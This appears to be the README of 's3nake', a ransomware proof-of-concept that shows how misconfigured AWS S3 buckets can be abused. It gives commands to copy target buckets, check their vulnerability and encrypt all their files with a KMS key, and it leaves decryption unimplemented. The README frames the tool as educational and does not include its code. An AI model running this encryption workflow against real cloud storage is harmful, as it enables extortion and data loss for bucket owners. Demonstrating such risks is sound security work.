<h2>s3nake <sup>(ransssomware PoC)</sup><br></h2>



<div align=center>

  
  <h3>~</h3>
  
  <strong>For educational purposes ONLY, not built for performance, some arrangements need to be done</strong>
  <br>It should mainly used to illustrate how a misconfigured s3 bucket could be abused. Proof-of-Concept built with the will to be harmless
  <h3>~</h3>
</div>



## Show 'em 🪄🎩🐇

*For all the command the flags -p/--profile, -r/--region, -b/buckets are not mandatory. Input will be requested if necessary.*

### 1. Set up - Copy the s3 buckets targeted
```shell
python s3nake.py setup -b [comma_separated_bucket_list] --check
```

* We perform a copy of the bucket to not alter the original one with the PoC
* `--check` flag performs s3 configuration checks to estimate wether or not the bucket is vulnerable to s3 ransomware attack

### 2. Perform the "ransomware" attack - Encrypt all the files

```shell
# to see the magic happen in real time
./watch_ransomware.sh [bucket_name]
# in another shell
python s3nake.py encrypt -b [comma_separated_bucket_list] -k [key_id]
```

* `-k`/`--key-id` flag is not mandatory, if not provided a KMS key will be automatically generated with the appropriate policy

### 3. Decrypt the ransomware - 
*TODO*
In fact, not really needed, as it is a PoC and should not be used as a real ransomware

### 4. Clean the PoC - delete s3 bucket copy
```shell
python s3nake.py clean -b [comma_separated_bucket_list]
```
